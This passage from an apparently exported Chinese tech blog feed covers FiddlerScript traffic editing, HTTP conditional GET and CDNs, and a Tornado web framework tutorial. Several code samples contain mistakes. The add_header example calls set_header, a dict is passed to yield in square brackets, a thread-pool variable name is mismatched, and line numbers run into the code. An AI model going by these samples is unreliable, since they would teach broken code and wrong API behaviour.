oSession["ui-color"] = "red"; } Fiddler Script中修改CookieCookie其实就是request 中的一个header,注意:FiddlerScript不能直接删除或者编辑单独的一个cookie， 你需要用replace方法或者正则表达式的方法去操作cookie的string 123456789101112static function OnBeforeRequest(oSession: Session) { if (oSession.HostnameIs('www.example.com') && oSession.uriContains('pagewithCookie') && oSession.oRequest.headers.Contains("Cookie")) { var sCookie = oSession.oRequest["Cookie"]; // 用replace方法或者正则表达式的方法去操作cookie的string sCookie = sCookie.Replace("cookieName=", "ignoreme="); oSession.oRequest["Cookie"] = sCookie; } 删除所有的cookie 1oSession.oRequest.headers.Remove("Cookie"); 新建cookie 1oSession.oRequest.headers.Add("Cookie", "username=testname;testpassword=P@ssword1"); Fiddler Script中修改Request 中的body 1234567891011121314151617static function OnBeforeRequest(oSession: Session) { if(oSession.uriContains("http://www.cnblogs.com/")) { // 获取Request中的body字符串 var strBody=oSession.GetRequestBodyAsString(); // 用正则表达式或者replace方法去修改string strBody=strBody.replace("1111","2222"); // 弹个对话框检查下修改后的body FiddlerObject.alert(strBody); // 将修改后的body，重新写回Request中 oSession.utilSetRequestBody(strBody); }} Vs插件 三方插件 .NET可以开发 插件管理 可供Fiddler使用的第三方插件地址如下：http://pan.baidu.com/s/1mgocpBihttp://fiddler.com/add-ons 浏览器抓包方式IE FireFox Chrome Visual Studio我们会用Visual Studio来开发ASP.NET网站的时候也需要用Fiddler来分析HTTP, 默认的时候Fiddler是不能嗅探到localhost的网站。在localhost后面加个点号，Fiddler就能嗅探到。 例如：原本ASP.NET的地址是 http://localhost:2391/Default.aspx， 加个点号后，变成 http://localhost.:2391/Default.aspx 就可以了。 移动端抓包Fiddler不但能截获各种浏览器发出的HTTP请求, 也可以截获各种智能手机发出的HTTP/HTTPS请求。 Fiddler能捕获IOS,Andriod,WinPhone,设备发出的请求，同理，也可以截获IPad, MacBook的等设备发出的HTTP/HTTPS。 前提条件是：安装Fiddler的机器，跟Iphone 在同一个网络里， 否则IPhone不能把HTTP发送到Fiddler的机器上来。 具体操作步骤如下： Fiddler设置 打开Fiddler，Tools-》Fiddler Options。(配置完记得要重启Fiddler) 选中“Allow remote computers to connect”，是允许别的机器把HTTP/HTTPS请求发送到Fiddler上来 获取Fiddler所在机器IP 安装Fiddler证书 这一步是为了让Fiddler能捕获HTTPS请求。 如果你只需要截获HTTP请求， 可以忽略这一步，首先要知道Fiddler所在的机器的IP地址：假如我安装了Fiddler的机器的IP地址是:192.168.1.104打开手机的浏览器, 访问 http://192.168.1.104:8888， 点”FiddlerRoot certificate” 然后安装证书。 再打开手机, 找到你的网络连接， 打开HTTP代理， 输入Fiddler所在机器的IP地址(比如:192.168.1.104) 以及Fiddler的端口号8888 另一种方式是通过WiFi，理解Fiddler抓取移动端的数据包，看看下面这张图； ​ 可以看出，移动端的数据包都是需要走WiFi出去的，因此我们可以把电脑热点打开，将手机连上电脑，Fiddler开启代理后，让这些数据通过Fiddler，Fiddler就可以抓到这些包，然后发给路由器。 推荐书籍 《Fiddler调试权威指南》 ​ 这本书是Fiddler的开发者Eric Lawrence编写的一本权威的参考指南。全书分为10章和4个附录，从认识Fiddler开始，介绍了基本技巧和概念、配置选项、Inspectors、扩展、数据流导入导出、FiddlerScript和FiddlerCore等主题；附录部分还给出了故障排除和命令行等有用的参考信息。 ​ 它适合Web开发人员和Web测试人员阅读参考，也适合想要学习和掌握Fiddler的读者阅读。通过《Fiddler调试权威指南》，你将学会如何利用Fiddler调试Web相关的应用，掌握如何调试HTTPS数据流，学会如何在流行的设备上使用Fiddler，甚至掌握更多高级的扩展功能。 其他同类抓包工具​ 同类的工具有 : HttpWatch, Firebug,Chrome自带调试工具，WireShark 总结 Fiddler能记录所有客户端和服务器的HTTP和HTTPS请求，允许你监视、设置断点，甚至修改输入输出数据，Fiddler包含了一个强大的基于事件脚本的子系统，并且能使用.NET语言进行扩展； 你对HTTP协议越了解，你就能越掌握Fiddler的使用方法，你越使用Fiddler,就越能帮助你了解HTTP协议，两者关系紧密、相辅相成； 强大图形呈现，拖拽操作，丰富的插件。 使用Fiddler无论对Coder还是Tester来说，都是非常有用的工具。 参考文献 Fiddler抓包工具总结 Fiddler教程 Fiddler官方教程]]></content>
      <categories>
        <category>debug工具</category>
      </categories>
      <tags>
        <tag>Fiddler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP]]></title>
    <url>%2F2019%2F08%2F17%2FHTTP%2F</url>
    <content type="text"><![CDATA[网络HTTP 条件 GET 使用的方法？​ 客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。 ​ 下面是一个具体的发送接受报文示例： ​ 客户端发送请求： 1234GET / HTTP/1.1 Host: www.sina.com.cn:80 If-Modified-Since:Thu, 4 Feb 2010 20:39:13 GMT Connection: Close 第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件 12345678HTTP/1.0 304 Not Modified Date: Thu, 04 Feb 2010 12:38:41 GMT Content-Type: text/html Expires: Thu, 04 Feb 2010 12:39:41 GMT Last-Modified: Thu, 04 Feb 2010 12:29:04 GMT Age: 28 X-Cache: HIT from sy32-21.sina.com.cn Connection: close CDN​ CDN的全称是Content Delivery Network，即内容分发网络，是指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户 ​ 内容分发网络节点会在多个地点，多个不同的网络上摆放。这些节点之间会动态的互相传输内容，对用户的下载行为最优化，并借此减少内容供应者所需要的带宽成本，改善用户的下载速度，提高系统的稳定性。 内容分发网络所需要的节点数量随着需求而不同，依照所需要服务的对象大小，有可能有数万台服务器]]></content>
      <categories>
        <category>HTTP协议</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Tornado]]></title>
    <url>%2F2019%2F04%2F03%2F%E6%B5%85%E8%B0%88Tornado%2F</url>
    <content type="text"><![CDATA[高并发处理框架—TornadoTornado介绍​ Tornado是一个可扩展的非阻塞式Web服务器及其相关工具的开源版本。Tornado每秒可以处理数以千计的；连接，对于实时的Web服务来说，Tornado是一个理想的Web框架。 ​ Tornado是使用Python编写的一个强大的可扩展的Web服务器，它在处理高网络流量时表现得足够强健,却在创建和编写时有着足够的轻量级，并且能够被用在大量的应用和工具中。相比于其他的Python网络框架，Tornado有如下特点。 完备的Web框架：与Django，Flask等一样，Tornado也提供了URL路由映射、Request上下文、基于模板的页面渲染技术等开发Web应用的必备工具。 是一个高效的网络库，性能与Twisted、Gevent等底层Python框架相媲美：提供了异步I/O支持、超时事件处理。这使得Tornado除了可以作为Web应用服务器框架，还可以用来做爬虫应用、物联网关、游戏服务器等后台应用。 提供高效的HTTPClient：除了服务器端框架，Tornado还提供了基于异步框架的HTTP客户端。 提供高效的内部HTTP服务器：虽然其他Python网络框架（Django，Flask）也提供了内部HTTP服务器，但它们的HTTP服务器由于性能原因只能用于测试环境。而Tornado的HTTP服务器与Tornado异步调用紧密结合，可以直接用于生产环境。 完备的WebSocket支持：WebSocket是HTML5的一种新标准，实现了浏览器与服务器之间的双向实时通信。 因为Tornado的上述特点，Tornado常被用作大型站点的接口服务框架，而不像Django那样着眼于建立完整的大型网站，着重讲解Tornado的异步及协程编程、身份认证框架、独特的非WSGI部署方式。 安装Tornado​ Tornado已经被配置到PyPI网站中，使得Tornado的安装非常简单。在Windows和Linux中都可以通过一条pip命令来完成安装。 ​ pip install tornado ​ 该条命令可以运行在操作系统中或python虚环境中。安装信息如下图所示： ​ 异步及协程基础​ 协程是Tornado中推荐的编程方式，使用协程可以开发出简捷，高效的异步处理代码。本章从同步I/O、异步I/O开始，逐步理解和掌握基于Tornado协程的编程技术。 同步和异步I/O​ 从计算机硬件发展的角度来看，当今计算机系统的CPU和内存发展速度日新月异，摩尔定律体现的十分明显。与之同时的硬盘、网络等于I/O相关的速度指标却进度缓慢。因此，在如今的计算机应用开发中，减少程序在I/O操作中的等待是对资源消耗、提高并发程度的必要考虑。 ​ 根据Unix Network Programing 一书中的定义，同步I/O操作(synchronous I/O operation)导致请求进程阻塞，直到I/O操作完成；异步I/O操作（asynchronous I/O operation）不导致请求进程阻塞。在Python中，同步I/O可以被理解为一个被调用的I/O函数会阻塞调用函数的执行，而异步I/O则不会阻塞调用函数的执行。代码举例如下: 123456from tornado.httpclient import HTTPClient #Tornado的HTTP客户端def synchronous_visit(): http_client = HTTPClient() response = http_client.fetch("www.baidu.com") #阻塞，直到对www.baidu.com访问完成 print(response.body) ​ HTTPClient是Tornado的同步访问HTTP客户端。上述代码中的synchronous_visit()函数使用了典型的同步I/O操作访问www.baidu.com网站，该函数的执行时间取决于网络速度、对方服务器响应速度等，只有等到对www.baidu.com的访问完成后并获取到结果后，才能完成对synchronous_visit函数的执行。 ​ 而使用异步I/O访问www.baidu.com网站的函数无需等待访问完成才能返回，譬如： 12345678from tornado.httpclient import AsyncHTTPClientdef handle_response(response): print(response.body) def asynchronous_visit(): http_client = AsyncHTTPClient() http_client.fetch("www.baidu.com",callback=handle_response) ​ AsyncHTTPClient是Tornado的异步访问HTTP客户端。在上述代码的asynchronous_visit函数中使用AsyncHTTPClient对第三方网站进行异步访问，http_client.fetch()函数会在调用后立刻返回而无需等待实际返回的完成，从而导致asynchronous_visit()也会立刻执行完成。当对www.baidu.com的访问实际完成后，AsyncHTTPClient会调用callback参数指定的函数，开发者可以在其中写入处理访问结果的逻辑代码。 yield关键字​ 协程是Tornado中进行异步I/O代码开发的方法，协程使用了Python的关键字yield将调用者挂起和恢复执行。在理解协程概念前，应首先理解Python中yield关键字的概念和使用方法，而学习yield之前需要了解迭代器的概念。 ​ 1. 迭代器 ​ 迭代器(Iterator)是访问集合内元素的一种方式。迭代器对象从集合的第1个元素开始访问，直到所有元素都被访问一遍后结束。迭代器不能回退，只能往前进行迭代。 ​ Python中最常使用迭代器的场景是循环语句for，它用迭代器封装集合，并且逐个访问集合元素以执行循环体。比如： 12for number in range(6): #range返回一个列表 print(number) ​ 其中的range()返回一个包含所指定元素的集合，而for语句将其封装一个迭代器后访问，使用iter()调用可以将列表、集合转换为迭代器，比如： 12345678wjq@Ubuntu:~$ pythonPython 2.7.12 (default, Jul 18 2016, 15:02:52) [GCC 4.8.4] on linux2Type "help", "copyright", "credits" or "license" for more information.>>> numbers = [1,3,5,7,8]>>> t = iter(numbers)>>> print(t) ​ 其中，t就是迭代器。迭代器与普通的Python对象的区别是迭代器有一个next()方法，每次调用该方法可以返回一个元素。调用者可以通过不断调用next()方法来逐个访问集合元素。比如： 123456789>>> iter = iter(range(6))>>> print(iter.next())0>>> print(iter.next())1>>> print(iter.next())2>>> print(iter.next())... ​ 调用者可以一直这样调用next()方法来访问迭代器，直到next()方法返回StopIteration异常以表示迭代已经完成，比如： 123456789>>> print(iter.next())4>>> print(iter.next())5>>> print(iter.next())Traceback (most recent call last): File "", line 1, in StopIteration>>> ​ 2. 使用yield ​ 迭代器在Python编程中适用范围很广，开发者可以使用yield定制自己的迭代器。调用任何定义中包含yield关键字的函数都不会执行该函数，而是会获得一个对应该函数的迭代器。 1234567891011121314code example:#!/usr/bin/env python#-*- coding:utf-8 -*-def demoIterator(): #定义一个迭代器函数 print("first call of next()") yield 1 print("second call of next()") yield 3 print("third call of next()") yield 9for i in demoIterator(): print(i) ​ 执行该部分代码结果如下： 1234567ssh://wjq@59.68.29.xx:22/home/wjq/TornadoWork/tor_env/bin/python -u /home/wjq/TornadoWork/tornado_0/temp/demo/7_1.pyfirst call of next()1second call of next()3third call of next()9 ​ 每次调用迭代器的next()函数，将执行迭代器函数。并返回yield的结果作为迭代返回元素。当迭代器函数return时，迭代器会抛出StopIteration异常使迭代终止。 ​ 注：在Python中，使用yield关键字定义的迭代器也被称为”生成器”。 协程​ 使用Tornado协程可以开发出类似同步代码的异步行为，并且因为协程本身不使用线程，所以减少了线程上下文切换的开销，是一种更为高效的开发模式。 ​ 1. 编写协程函数 ​ 使用协程技术开发网页访问的代码如下： 12345678from tornado import gen #引入协程库genfrom tornado.httpclient import AsyncHTTPClient@gen.coroutine #使用gen.coroutine修饰器def coroutine_visit(): http_client = AsyncHTTPClient() response = yield http_client.fetch("www.baidu.com") print(response.body) ​ 本例中仍然使用异步客户端AsyncHTTPClient进行页面访问，使用@gen.coroutine表明用装饰器声明这是一个协程函数。由于yield关键字的使用，使得代码中不用再编写回调函数用于处理访问结果，而可以直接在yield语句的后面编写结果处理语句。 ​ 2. 编写协程函数 ​ 由于Tornado协程基于Python的yield关键字实现，所以不能像调用普通函数一样调用协程函数。 协程函数可以通过以下三种方式进行调用。 在本身是协程的函数内通过yield关键字调用。 在IOLoop尚未启动时，通过IOLoop的run_sync()函数调用。 在IOLoop已经启动时，通过IOLoop的spawn_callback()函数调用。 举一个“通过协程函数调用协程函数”的例子： 1234567from tornado import gen # 引入协程库gen@gen.coroutinedef outer_coroutine(): print("start call another coroutine") yield coroutine_visit() print("end of outer_coroutine") ​ 本例中coroutine_visit和outer_coroutine都是协程函数，所以它们之间可以通过yield关键字进行调用。IOLoop是Tornado的主事件循环对象，Tornado程序通过它监听外部客户端的访问请求，并执行相应的操作。当程序尚未进入IOLoop的running状态时，可以通过run_sync()函数调用协程函数。比如： 123456from tornado.ioloop import IOLoop #引入IOLoop对象def func_normal(): print("start to call a coroutine") IOLoop.current().run_sync(lambda: coroutine_visit()) print("end of calling a coroutine") ​ 此处无需过分了解IOLoop，后面会逐步了解IOLoop的具体概念及应用方法。 ​ 上例中引用tornado.ioloop包中的IOLoop对象，之后在普通函数中使用run_sync()函数调用经过lambda封装的协程函数。run_sync()函数将阻塞当前函数的执行，直到被调用的协程执行完成。 ​ 事实上，Tornado要求协程函数在IOLoop的runing状态中才能被调用，只不过run_sync函数自动完成了启动、停止IOLoop的步骤，它的实现逻辑为：启动IOLoop—>调用被lambda封装的协程函数—>停止IOLoop。当Tornado程序已经处于running状态时的协程函数的调用示例如下： 123456from tornado.ioloop import IOLoop #引入IOLoop对象def func_normal(): print("start to call a coroutine") IOLoop.current().spawn_callback(coroutine_visit) print("end of calling a coroutine") ​ 本例中spawn_callback()函数将不会等待被调用协程执行完成。所以spawn_callback()之前和之后的print语句将会被连续执行，而coroutine_visit本身将会由IOLoop在合适的时机进行调用。 ​ IOLoop的spawn_callback()函数没有为开发者提供获取协程函数调用返回值的方法，所以只能用spawn_callback()调用没有返回值的协程函数。 ​ 3. 在协程中调用阻塞函数 ​ 在协程中直接调用阻塞函数会影响协程本身的性能，所以Tornado提供了在协程中利用线程池调度阻塞函数，从而不影响协程本身继续执行的方法。示例如下： 12345678910111213from concurrent.futures import ThreadPoolExecutorthread_tool = ThreadPoolExecutor(2)def mySleep(count): import time for i in range(count): time.sleep(1)@gen.coroutinedef call_blocking(): print("start of call_blocking") yield thread_pool.submit(mySleep,10) print("end of call_blocking") ​ 代码中首先引用了concurrent.futures中的ThreadPoolExecutor类，并实例化了一个有两个线程的线程池thread_pool。在需要调用阻塞函数的协程call_blocking中，使用thread_pool.submit调用阻塞函数，并通过yield返回。这样便不会阻塞协程所在线程的继续执行，也保证了阻塞函数前后代码的执行顺序。 ​ 4. 在协程中等待多个异步调用 ​ 目前只讲述了协程中一个yield关键字等待一个异步调用，实际上tornado允许在协程中用一个yield关键字等待多个异步调用，只需要把这些调用用列表(list)或字典(dictionary)的方式传递给yield关键字即可。 ​ 使用列表方式传递多个异步调用的示例代码如下： 12345678910111213from tornado import gen # 引入协程库from tornado.httpclient import AsyncHTTPClient@gen.coroutine # 使用gen.coroutine修饰器def coroutine_visit(): http_client = AsyncHTTPClient() list_response = yield[ http_client.fetch("www.baidu.com"), http_client.fetch("www.sina.com"), http_client.fetch("www.163.com"), http_client.fetch("www.google.com") ] for response in list_response: print response.body ​ 在代码中仍然用@gen.coroutine装饰器定义协程，在需要yield的地方用列表传递若干个异步调用，只有在列表中的所有调用都执行完成后，yield才会返回并继续执行。yield以列表形式返回N个调用的输出结果，可以通过for语句逐个访问。 ​ 使用字典方式传递多个异步调用的示例代码如下： 123456789101112from tornado import gen # 引入协程库from tornado.httpclient import AsyncHTTPClient@gen.coroutine # 使用gen.coroutine修饰器def coroutine_visit(): http_client = AsyncHTTPClient() dict_response = yield[ "baidu": http_client.fetch("www.baidu.com"), "sina": http_client.fetch("www.sina.com"), "163": http_client.fetch("www.163.com"), "google": http_client.fetch("www.google.com") ] print dict_response["sina"].body ​ 本例中以字典形式给yield关键字传递异步调用要求，并且Tornado以字典形式返回异步调用的结果。 Tornado框架知识Tornado概述​ Tornado全称是Tornado Web Server，是一个用Python语言写成的Web服务器兼网络框架。特点和性能总结如下： ​ 特点： 轻量级的Web框架，其拥有异步非阻塞IO的处理方式。 作为Web服务器，Tornado有较为出色的抗负载能力，官方用Nginx反向代理的方式部署Tornado和其它Python Web应用框架，为了最大化的利用Tornado的性能，推荐同时使用tornado和其它Python Web应用框架进行对比，结果最大浏览量超过第二名近40%. 性能： Tornado性能优异，它试图解决 C10K问题，即处理大于或等于一万的并发连接。 Tornado框架和服务器一起可以组成一个WSGI的全栈替代品，如果单独在WSGI容器中使用tornado网络框架或者tornaod http服务器 ，存在一定的局限性。为了最大化的利用tornado的性能，推荐同时使用tornado+HTTP服务器。 应用场景 用户量大，高并发 如秒杀抢购，双11某宝购物、春节抢火车票等。 大量的HTTP持久连接 ​ 使用同一个TCP连接来发送和接收多个HTTP请求 or 应答，而不是为每一个请求 or 应答打开新的连接的方法。 ​ 对于HTTP 1.0，可以在请求的包头(Header)中添加Connection:Keep-Alive。 ​ 对于HTTP 1.1，所有的连接默认为持久连接。 Tornado与Django比较​ Tornado ​ Tornado走的是少而精的方向，注重的是性能优越，最为出名的是它的异步非阻塞的设计方式。 HTTP服务器 异步编程 WebSocket Djangoo Django走的是大而全的方向，注重开发高效，最为出名的是它自动化的管理后台，只需要使用起ORM，做简单的对象定义，它就能自动生成数据库，以及功能齐全的管理后台。 Django所提供的方便，意味着Django内置的ORM跟框架内的其他模块耦合度高，应用程序必须使用Django内置的ORM，否则就不能享受到框架内提供的种种基于ORM的便利。 Session功能 后台管理 ORM 简单Tornado示例123456789101112131415161718192021#-*- coding:utf-8 -*-import tornado.httpserverimport tornado.ioloopimport tornado.webfrom tornado.options import define,optionsdefine("port",default=8000,help="run on the given port",type=int)class IndexHandler(tornado.web.RequestHandler): '''主路由处理类''' def get(self): '''对应http的get请求方式''' greeting = self.get_argument('greeting','Hello') self.write(greeting + ', tornado!')if __name__ == "__main__": tornado.options.parse_command_line() app = tornado.web.Application(handlers=[(r"/",IndexHandler)]) http_server = tornado.httpserver.HTTPServer(app) http_server.listen(options.port) tornado.ioloop.IOLoop.instance().start() 上述代码解释说明： tornado的基础Web框架模块 RequestHandler 封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式(get、post等)，把对应的处理逻辑写进同名的成员方法中(如对应get请求方式，就将对应的处理逻辑写在get()方法中)，当没有对应请求方式的成员方法时，会返回“405: Method Not Allowed”错误。 Application Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口(注意：此时服务器并未开启监听)。 Tornado核心IOLoop循环模块​ tornado的核心io循环模块，封装了Linux的epoll和BSD的kqueue，也是tornado高性能的基石。以Linux的epoll为例，其原理如下图： ​ ​ 针对具体实例，访问路径如下图： IOLoop.current()返回当前线程的IOLoop实例。 IOLoop.start() 启动IOLoop实例的I/O循环，同时服务器监听被打开。 2.6 Tornado Web程序编写思路 创建Web应用实例对象，第一个初始化参数为路由映射列表。 定义实现路由映射表中的handler类。 创建服务器实例，绑定服务器端口。 启动当前线程的IOLoop。 开发Tornado网站​ 下面会展示使用Tornado建立Web站点的方法。 网站结构​ 通过编写hellowowld学习Tornado网站的基本结构： 1234567891011121314151617import tornado.ioloopimport tornado.webclass MainHandler(tornado.web.RequestHandler): def get(self): self.write("Hello World!")def make_app(): return tornado.web.Application([(r"/",MainHandler),])def main(): app = make_app() app.listen(8888) tornado.ioloop.IOLoop.current().start() if __name__ == "__main__": main() ​ 下面逐行解析上面的代码做了些什么。 ​ (1) 首先是通过import语句引入tornado包中ioloop和web类。引入这两个类是Tornado程序的基础。 ​ (2) 实现一个web.RequestHandler子类，重载其中的get()函数，该函数负责相应定位到该Request Handler的HTTP GET请求的处理。本例中简单的使用self.write()函数输出hello world。 ​ (3) 定义了make_app()函数，该函数返回一个web.Application对象。该对象的第1个参数用于定义Tornado程序的路由映射。本例中将对根URL的访问映射到了RequestHandler子类MainHandler中。 ​ (4) 用web.Application.listen()函数指定服务器监听的端口。 ​ (5) 用tornado.ioloop.IOLoop.current().start()启动IOLoop，该函数将一直运行且不退出，用于处理完所有的客户端的访问请求。 路由解析​ 向web.Application对象传递的第1个参数URL路由映射列表的配置方式与Django类似，用正则字符串进行路由匹配。Tornado的路由字符串有两种，固定字符路径和参数字串路径。 固定字串路径 固定子串是普通的字符串固定匹配，比如： 1234Handlers = [("/",MainHandler), #只匹配根路径 ("/entry",EntryHandler), #只匹配/entry ("/entry/2015",Entry2015Handler) #只匹配/entry/2015 ] 参数字串路径 ​ 参数字串可以将具备一定模式的路径映射到同一个RequestHandler中处理，其中路径中的参数部分用小括号”()”标识，下面是一个参数路径的例子： 123456789# url handlerhandlers = [(r"/entry/([^/]+)",EntryHandler),]class EntryHandler(tornado.web.RequestHandler): def get(self,slug): entry = self.db.get("SELECT * FROM entries WHERE slug = %s",slug) if not entry: raise tornado.web.HTTPError(404) self.render("entry.html",entry=entry) ​ 例中用 "/entry/([^/]+)" 定义以/entry/开头的URL模式。小括号的内容是正则表达式，URL尾部的变量部分以参数形式传递给RequestHandler中的get()函数，本例中将该参数命名为slug。 带默认值的参数路径 ​ 之前例子中的handlers = [(r"/entry/([^/]+)",EntryHandler),]模式定义了客户端必须输入路径参数。比如，其能够匹配如下路径： 12http://xx.xx.xx.xx/entry/abchttp://xx.xx.xx.xx/entry/2019-03-10 ​ 但是其无法匹配，http://xx.xx.xx.xx/entry ， ​ 对于需要匹配客户端未传入时的路径，则需要用如下方法改变URL路径和对get()函数的定义： 123456789# url handlerhandlers = [(r"/entry/([^/]*)",EntryHandler),]class EntryHandler(tornado.web.RequestHandler): def get(self,slug='default'): entry = self.db.get("SELECT * FROM entries WHERE slug = %s",slug) if not entry: raise tornado.web.HTTPError(404) self.render("entry.html",entry=entry) ​ 本例中首先用星号”*”取代加号”+”定义了URL模式，然后为RequestHandler子类的get()函数的slug参数配置了默认值default。 多参数路径 参数路径还允许在一个URL模式中定义多个可变参数，比如： 1234567handlers = [ (r'/(\d{4})/(\d{2})/(\d{2})/([a-zA-Z\-0-9\.:,_]+)/?',DetailHandler)]class DetailHandler(tornado.web.RequestHandler): def get(self, year, month, day, slug): self.write("%d-%d-%d %s"%(year, month, day, slug)) ​ 本例中的URL模式定义了year、month、day、slug等4个参数。 RequestHandler​ 经过前面的学习，大致了解到RequestHandler类在Tornado网站程序中的重要作用，它是配置和响应URL请求的核心类，下面将介绍RequestHandler的更多内容。 接入点函数 ​ 需要子类继承并定义具体行为的函数在RequestHandler中被称为接入点函数(Entry Point)，之前常用的get()函数就是典型的接入点函数。其它可用的接入点函数如下所述。 ​ （1）RequestHandler.initialize() ​ 该方法被子类重写，实现了RequestHandler子类实例的初始化过程。可以将该函数传递参数，参数来源于配置URL映射时的定义。比如： 1234567891011121314from tornado.web import RequestHandlerfrom tornado.web import Applicationclass ProfileHandler(RequestHandler): def initialize(self,database): self.database = database def get(self): pass def post(self): passapp = Application([(r'/account',ProfileHandler,dict(database="c:\\example.db")),]) ​ 本例中的initialize有参数database，该参数由Application定义URL映射时以dict形式给出。 ​ （2）RequestHandler.prepare()、RequestHandler.on_finish() ​ prepare()方法用于调用请求处理(get、post等)方法之前的初始化处理，而on_finish()用于请求处理结束后的一些清理工作，这两种方法一个在处理前，一个在处理后，可以根据实际需要进行重写。通常prepare()方法做资源初始化操作，而用on_finish()方法可做清理对象占用的内存或者关闭数据库连接等工作。 ​ （3）HTTP Action处理函数 ​ 每个HTTP Action在RequestHandler中都以单独的函数进行处理。 RequestHandler.get(*args,**kargs) RequestHandler.head(*args,**kargs) RequestHandler.post(*args,**kargs) RequestHandler.delete(*args,**kargs) RequestHandler.patch(*args,**kargs) RequestHandler.put(*args,**kargs) RequestHandler.options(*args,**kargs) 每个处理函数都以它们对应的HTTP Action小写的方式命名。 输入捕获 ​ 输入捕获是指在RequestHandler中获取客户端输入的工具函数和属性，比如获取URL查询字符串、POST提交参数等。 ​ （1）RequestHandler.get_argument(name)、RequestHandler.get_arguments(name) ​ 都是返回给定参数的值。get_argument获得单个值；而get_arguments是针对参数存在多个值的情况下使用的，返回多个值的列表。用get_argument/get_arguments()方法获取的是URL查询字符串参数与Post提交参数的参数合集。 ​ (2) RequestHandler.get_query_argument(name)、RequestHandler.get_query_argument (name) ​ 它们与get_argument、get_arguments的功能类似，但是仅从URL查询参数中获取参数值。 ​ (3)RequestHandler.get_body_argument(name)、RequestHandler.get_body_arguments (name) ​ 与get_argument、get_arguments的功能类似，但是仅从Post提交参数中获取参数值。 ​ 一般来说，使用get_argument/get_arguments即可。因为它们是get_query_argument/get_query_arguments和get_body_argument/get_body_arguments的合集。 ​ (4)RequestHandler.get_cookie(name,default=None) ​ 根据Cookie名称获取Cookie值。 ​ (5)RequestHandler.request ​ 返回tornado.httputil.HTTPServerRequest对象实例的属性，通过该对象可以获取关于HTTP请求的一切信息。比如： 123456import tornado.webclass DetailHandler(tornado.web.RequestHandler): def get(): remote_ip = self.request.remote_ip #获取客户端IP地址 host = self.request.host #获取请求的主机地址 ​ 常用的httputil.HTTPServerRequest对象属性如下表所示： 属性名 说明 method HTTP请求方法，比如GET、POST等 url 客户端请求的url的完整内容 query url中的查询字符串 version 客户端发送请求时使用的HTTP版本，比如HTTP/1.1 headers 以字典方式表达的HTTP Headers body 以字符串方式表达的HTTP消息体 remote_ip 客户端的IP地址 Protocol 请求协议，比如HTTP、HTTPS host 请求消息中的主机名 arguments 客户端提交的所有参数 files 以字典方式表达的客户端上传的文件，每个文件名对应一个HTTPFile cookies 客户端提交的cookie字典 输出响应函数 ​ 输出响应函数是指一组为客户端生成处理结果的工具函数，开发者调用它们以控制URL的处理结果。常用的输出相应函数如下。 ​ (1) RequestHandler.set_status(status_code,reason=None) ​ 设置HTTP Resource中的返回码，如果有描述性的语句，则可以赋值给reason参数。 ​ (2)RequestHandler.set_header(name,value) ​ 以键值对的方式配置HTTP Response中的HTTP头参数。使用set_header配置的Header值将覆盖之前配置的Header，比如： 123456import tornado.webclass DetailHandler(tornado.web.RequestHandler): def get(): self.set_header("NUMBER",9) self.set_header("LANGUAGE","France") self.set_header("LANGUAGE","Chinese") 本例中的get()函数调用了3次set_header，但是只配置了两个header参数，最后的HTTP Header中的参数将会是： 12NUMBER: 9LANGUAGE: Chinese ​ (3)RequestHandler.add_header(name,value) ​ 以键值对的方式设置HTTP Response中的HTTP头参数。与set_header不同的是add_header配置的Header值将不会覆盖之前配置的Header，比如： 123456import tornado.webclass DetailHandler(tornado.web.RequestHandler): def get(): self.set_header("NUMBER",8) self.set_header("LANGUAGE","France") self.set_header("LANGUAGE","Chinese") ​ 最后HTTP Header中的参数将会是： 123NUMBER: 8LANGUAGE: France LANGUAGE: Chinese ​ (4)RequestHandler.write(chunk) ​ 将给定的块作为HTTP Body发送给客户端。在一般情况下，用本函数输出字符串给客户端，如果给定的块是一个字典，则会将这个块以JSON格式发送给客户端，同时将HTTP header中的Content_type设置成application/json。 ​ (5)RequestHandler.finish(chunk=None) ​ 本方法通知Tornado:Response的生成工作已完成，chunk参数是需要传递给客户端的HTTP body。调用finish()后，Tornado将向客户端发送HTTP Response。本方法适用于对RequestHandler的异步请求处理，异步请求的具体方法详见3.4节。 注意：在同步或协程访问处理的函数中，无需调用finish()函数。 ​ (6)RequestHandler.render(template_name, **kwargs) ​ 用给定的参数渲染模板，可以在本函数中传入模板文件名称和模板参数，比如： 12345import tornado.webclass MainHandler(tornado.web.RequestHandler): def get(self): items = ["Python","C++","Java"] self.render("template.html",title="Tornado Template",items=items) ​ render()的第1个参数是对模板文件的命名，之后以命名参数的形式传入多个模板参数。Tornado的基本模板语法和Django相同，功能上弱化，高级过滤器不可用。 ​ (7) RequestHandler.redirect(url,permanent=False,status=None) ​ 进行页面重定向。在RequestHandler处理过程中，可以随时调用redirect()函数进行页面重定向，比如： 12345678910111213141516import tornado.webclass LoginHandler(tornado.web.RequestHandler): def get(self): self.render("login.html",next=self.get_argument("next","/")) def post(self): username = self.get("username","") password = self.get("password","") auth = self.db.authenticate(username, password) if auth: self.set_current_user(username) self.redirect(self.get_argument("next",u"/")) else: error_msg = u"?error=" + tornado.escape.url_escape("Login incorrect.") self.redirect(u"/login" + error_msg) ​ 在本例LoginHandler的post处理函数中，根据验证是否成功将客户端重定向到不同的页面，如果成功则重定向到next参数所指向的URL；如果不成功，则重定向到”/login”页面。 ​ (8) RequestHandler.clear() ​ 清空所有在本次请求中之前写入的Header和Body内容，比如： 123456import tornado.webclass DetailHandler(tornado.web.RequestHandler): def get(): self.set_header("NUMBER",8) self.clear() self.set_header("LANGUAGE","France") ​ (9) 